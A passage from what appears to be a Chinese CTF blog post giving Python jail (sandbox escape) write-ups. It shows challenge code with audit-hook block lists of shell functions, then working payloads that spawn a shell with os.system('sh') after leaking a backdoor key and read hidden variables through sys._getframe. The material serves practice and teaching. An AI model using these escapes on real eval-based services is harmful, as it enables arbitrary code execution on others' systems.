class="hljs-built_in">eval</span>(code))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Nooo!!!!&quot;</span>)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _         _          _         _          _         _        </span><br><span class="hljs-string"> | |  ____ | |        | |  ____ | |        | |  ____ | |       </span><br><span class="hljs-string"> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ </span><br><span class="hljs-string"> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \</span><br><span class="hljs-string"> | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/</span><br><span class="hljs-string"> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|</span><br><span class="hljs-string">     \____/               \____/               \____/                                                                                                                                                                                                                                        </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Now the program has two functions&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;can you use dockerdoor&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1.func&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2.backdoor&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span>(input_data == <span class="hljs-string">&quot;1&quot;</span>):<br>    func()<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">elif</span>(input_data == <span class="hljs-string">&quot;2&quot;</span>):<br>    backdoor()<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not found the choice&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>可知func长度限制dao了6，这时我们就可以试试之前用过的help函数</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">help</span>()<br><br>Welcome to Python <span class="hljs-number">3.10</span><span class="hljs-string">&#x27;s help utility!</span><br><span class="hljs-string"></span><br><span class="hljs-string">If this is your first time using Python, you should definitely check out</span><br><span class="hljs-string">the tutorial on the internet at https://docs.python.org/3.10/tutorial/.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enter the name of any module, keyword, or topic to get help on writing</span><br><span class="hljs-string">Python programs and using Python modules.  To quit this help utility and</span><br><span class="hljs-string">return to the interpreter, just type &quot;quit&quot;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">To get a list of available modules, keywords, symbols, or topics, type</span><br><span class="hljs-string">&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes</span><br><span class="hljs-string">with a one-line summary of what it does; to list the modules whose name</span><br><span class="hljs-string">or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">help&gt; __main__</span><br><span class="hljs-string">Help on module __main__:</span><br><span class="hljs-string"></span><br><span class="hljs-string">NAME</span><br><span class="hljs-string">    __main__</span><br><span class="hljs-string"></span><br><span class="hljs-string">DESCRIPTION</span><br><span class="hljs-string">    #it seems have a backdoor as `lake lake lake`</span><br><span class="hljs-string">    #but it seems be limited!</span><br><span class="hljs-string">    #can u find the key of it and use the backdoor</span><br><span class="hljs-string"></span><br><span class="hljs-string">FUNCTIONS</span><br><span class="hljs-string">    backdoor()</span><br><span class="hljs-string"></span><br><span class="hljs-string">    func()</span><br><span class="hljs-string"></span><br><span class="hljs-string">DATA</span><br><span class="hljs-string">    WELCOME = &#x27;</span>\n  _         _          _         _          _  ...       ...<br>    __annotations__ = &#123;&#125;<br>    input_data = <span class="hljs-string">&#x27;1&#x27;</span><br>    key_9d38ee7f31d6126d = <span class="hljs-string">&#x27;95c720690c2c83f0982ffba63ff87338&#x27;</span><br><br>FILE<br>    /home/ctf/server.py<br></code></pre></td></tr></table></figure>
+
+<p>当我吗输入__ main __ 的时候我们会得到该模块的帮助。</p>
+<p>然后得到key的值</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28751</span><br><br>  _         _          _         _          _         _<br> | |  ____ | |        | |  ____ | |        | |  ____ | |<br> | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____<br> | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _  | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/ | | | (_| |   &lt;  __/<br> |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|<br>     \____/               \____/               \____/<br><br><br>Now the program has two functions<br>can you use dockerdoor<br><span class="hljs-number">1.</span>func<br><span class="hljs-number">2.</span>backdoor<br>&gt; <span class="hljs-number">2</span><br>Please enter the admin key<br>&gt;95c720690c2c83f0982ffba63ff87338<br>&gt;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;sh&#x27;</span>)<br>sh: <span class="hljs-number">0</span>: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ ls</span><br><span class="hljs-string">__pycache__  flag  server.py</span><br><span class="hljs-string">$ cat flag</span><br><span class="hljs-string">flag=NSSCTF&#123;eec5b8a6-ca31-42f5-8d72-99d952240b09&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="HNCTF-2022-WEEK2-lak3-lak3-lak3-JAIL"><a href="#HNCTF-2022-WEEK2-lak3-lak3-lak3-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)"></a>[HNCTF 2022 WEEK2]lak3 lak3 lak3(JAIL)</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#Hi hackers,lak3 comes back</span><br><span class="hljs-comment">#Have a good luck on it! :Wink:</span><br><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br><span class="hljs-keyword">import</span> sys<br>sys.addaudithook<br><br>BLACKED_LIST = [<span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>]<br><br>eval_func = <span class="hljs-built_in">eval</span><br>open_func = <span class="hljs-built_in">open</span><br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> BLACKED_LIST:<br>    <span class="hljs-keyword">del</span> __builtins__.__dict__[m]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_audit_hook</span>(<span class="hljs-params">event, _</span>):<br>    BALCKED_EVENTS = <span class="hljs-built_in">set</span>(&#123;<span class="hljs-string">&#x27;pty.spawn&#x27;</span>, <span class="hljs-string">&#x27;os.system&#x27;</span>, <span class="hljs-string">&#x27;os.exec&#x27;</span>, <span class="hljs-string">&#x27;os.posix_spawn&#x27;</span>,<span class="hljs-string">&#x27;os.spawn&#x27;</span>,<span class="hljs-string">&#x27;subprocess.Popen&#x27;</span>,<span class="hljs-string">&#x27;code.__new__&#x27;</span>,<span class="hljs-string">&#x27;function.__new__&#x27;</span>,<span class="hljs-string">&#x27;cpython._PySys_ClearAuditHooks&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>&#125;)<br>    <span class="hljs-keyword">if</span> event <span class="hljs-keyword">in</span> BALCKED_EVENTS:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(event))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guesser</span>():<br>    game_score = <span class="hljs-number">0</span><br>    sys.stdout.write(<span class="hljs-string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)<br>    sys.stdout.flush()<br>    right_guesser_question_answer = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">9999999999999</span>)<br>    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout<br><br>    <span class="hljs-keyword">try</span>:<br>        input_data = eval_func(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)<br>    <span class="hljs-keyword">except</span> Exception:<br>        sys.stdout = challenge_original_stdout<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Seems not right! please guess it!&quot;</span>)<br>        <span class="hljs-keyword">return</span> game_score<br>    sys.stdout = challenge_original_stdout<br><br>    <span class="hljs-keyword">if</span> input_data == right_guesser_question_answer:<br>        game_score += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-keyword">return</span> game_score<br><br>WELCOME=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _       _    ____    _       _    ____    _       _    ____  </span><br><span class="hljs-string"> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \ </span><br><span class="hljs-string"> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |</span><br><span class="hljs-string"> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt; </span><br><span class="hljs-string"> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |</span><br><span class="hljs-string"> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/ </span><br><span class="hljs-string">                                                                                                                                                                       </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-built_in">print</span>(WELCOME)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Welcome to my guesser game!&#x27;</span>)<br>    game_score = guesser()<br>    <span class="hljs-keyword">if</span> game_score == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;you are really super guesser!!!!&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;fake_flag_in_local_but_really_in_The_remote&#125;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Guess game end!!!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.addaudithook(my_audit_hook)<br>    main()<br><br></code></pre></td></tr></table></figure>
+
+<p>把函数ban掉了，需要猜对数字才能获取flag</p>
+<p>显而易见正确答案在right_guesser_question_answer里。</p>
+<p>sys._getframe()函数<br>可以调用栈的帧对象，默认参数为0如果传入0那就会获取eval的调用栈帧，所以需要deep一层</p>
+<p>有个小技巧，可以使用__import__(“sys”).<strong>stdout</strong>.write去进行标准输出，这也是上一个非预期的输出方法。</p>
+<p><strong>import</strong>(“sys”).<strong>stdout</strong>.write(str(<strong>import</strong>(‘sys’)._getframe(1)))</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28864</span><br><br>  _       _    ____    _       _    ____    _       _    ____<br> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \<br> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |<br> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;<br> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |<br> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/<br><br><br><br>Welcome to my guesser game!<br>Can u guess the number? between <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">9999999999999</span> &gt; <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;sys&quot;</span>).__stdout__.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)._getframe(<span class="hljs-number">1</span>)))<br>&lt;frame at <span class="hljs-number">0x7ff87255d590</span>, file <span class="hljs-string">&#x27;/home/ctf/./server.py&#x27;</span>, line <span class="hljs-number">31</span>, code guesser&gt;Guess game end!!!<br><br></code></pre></td></tr></table></figure>
+
+<p>发现’&#x2F;home&#x2F;ctf&#x2F;.&#x2F;server.py‘直接调用f_locals查看变量</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28864</span><br><br>  _       _    ____    _       _    ____    _       _    ____<br> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \<br> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |<br> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;<br> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |<br> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/<br><br><br><br>Welcome to my guesser game!<br>Can u guess the number? between <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">9999999999999</span> &gt; <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;sys&quot;</span>).__stdout__.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)._getframe(<span class="hljs-number">1</span>).f_locals))<br>&#123;<span class="hljs-string">&#x27;game_score&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;right_guesser_question_answer&#x27;</span>: <span class="hljs-number">2500207681611</span>, <span class="hljs-string">&#x27;challenge_original_stdout&#x27;</span>: &lt;_io.TextIOWrapper name=<span class="hljs-string">&#x27;&lt;stdout&gt;&#x27;</span> mode=<span class="hljs-string">&#x27;w&#x27;</span> encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>&gt;&#125;Guess game end!!!<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<p>然后构造payload </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)._getframe(<span class="hljs-number">1</span>).f_locals[<span class="hljs-string">&quot;right_guesser_question_answer&quot;</span>]))<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28864</span><br><br>  _       _    ____    _       _    ____    _       _    ____<br> | |     | |  |___ \  | |     | |  |___ \  | |     | |  |___ \<br> | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) |<br> | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;  | |/ _` | |/ /|__ &lt;<br> | | (_| |   &lt; ___) | | | (_| |   &lt; ___) | | | (_| |   &lt; ___) |<br> |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/  |_|\__,_|_|\_\____/<br><br><br><br>Welcome to my guesser game!<br>Can u guess the number? between <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">9999999999999</span> &gt; <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)._getframe(<span class="hljs-number">1</span>).f_locals[<span class="hljs-string">&quot;right_guesser_question_answer&quot;</span>]))<br>you are really <span class="hljs-built_in">super</span> guesser!!!!<br>NSSCTF&#123;60ab0629-81f1-42cd-9b23-24fb58531aa5&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="calc-jail-beginner-level6"><a href="#calc-jail-beginner-level6" class="headerlink" title="calc_jail_beginner_level6"></a>calc_jail_beginner_level6</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28599</span><br><br>  _                _                           _       _ _   _                _   __<br> | |              (_)                         (_)     (_) | | |              | | / /<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/</span><br><span class="hljs-string">              __/ |                          _/ |</span><br><span class="hljs-string">             |___/                          |__/</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Welcome to the python jail</span><br><span class="hljs-string">Let&#x27;</span>s have an beginner jail of calc<br>Enter your expression <span class="hljs-keyword">and</span> I will evaluate it <span class="hljs-keyword">for</span> you.<br>White <span class="hljs-built_in">list</span> of audit hook ===&gt; builtins.<span class="hljs-built_in">input</span>,builtins.<span class="hljs-built_in">input</span>/result,<span class="hljs-built_in">exec</span>,<span class="hljs-built_in">compile</span><br>Some code of python jail:<br><br>  dict_global = <span class="hljs-built_in">dict</span>()<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>      <span class="hljs-keyword">try</span>:<br>          input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>      <span class="hljs-keyword">except</span> EOFError:<br>          <span class="hljs-built_in">print</span>()<br>          <span class="hljs-keyword">break</span><br>      <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>          <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bye~~&#x27;</span>)<br>          <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">if</span> input_data == <span class="hljs-string">&#x27;&#x27;</span>:<br>          <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">try</span>:<br>          complie_code = <span class="hljs-built_in">compile</span>(input_data, <span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>, <span class="hljs-string">&#x27;single&#x27;</span>)<br>      <span class="hljs-keyword">except</span> SyntaxError <span class="hljs-keyword">as</span> err:<br>          <span class="hljs-built_in">print</span>(err)<br>          <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">try</span>:<br>          <span class="hljs-built_in">exec</span>(complie_code, dict_global)<br>      <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br>          <span class="hljs-built_in">print</span>(err)<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Misc/" class="category-chain-item">Misc</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Python/" class="print-no-link">#Python</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Pyjail下</div>
+      <div>http://xiaoxiaoxiaoxiaocai.github.io.com/2024/03/04/Pyjail下/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>xiaocai</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 4, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/27/Ethernaut/" title="Ethernaut">
+                        <span class="hidden-mobile">Ethernaut</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
